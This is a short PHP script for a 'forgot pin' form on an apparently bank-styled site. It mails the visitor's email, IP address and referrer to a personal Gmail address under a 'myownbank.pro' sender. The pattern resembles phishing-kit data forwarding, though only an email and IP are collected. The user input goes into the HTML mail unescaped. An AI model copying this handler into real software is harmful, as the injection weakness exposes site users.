<?php 
    $to = "poghos877@gmail.com";
    $subject = "This is message, on forgot pin code";
    $index = 'index.html';
    $email = trim($_POST["email"]);
    $ip = $_SERVER['REMOTE_ADDR']; 
    $http_referrer = getenv( "HTTP_REFERER" );
    $date = date('d.M.Y');

    $message = "<p>This message was sent from: <b>$http_referrer</b> </p>";
    $message .= "<p>Email of user: <b>$email</b> </p>";
    $message .= "<p>IP address of user: <b>$ip</b> </p>";
    $message .= "<p>Date of dispatch: <b>$date</b> </p>";
    $message .= "<p>This user has forgotten their pin and wants to reset it.</p>";
    
    $header = "From: myownbank.pro \r\n";
    // $header = "From: $name" . "myownbank.pro \r\n";
    $header .= "MIME-Version: 1.0\r\n";
    $header .= "Content-type: text/html\r\n";
    
    $retval = mail ($to,$subject,$message,$header);
    
    if($retval == true) {
        header( "Location: $index" ); 
    }

    header( "Location: $index" ); 

    exit;
?>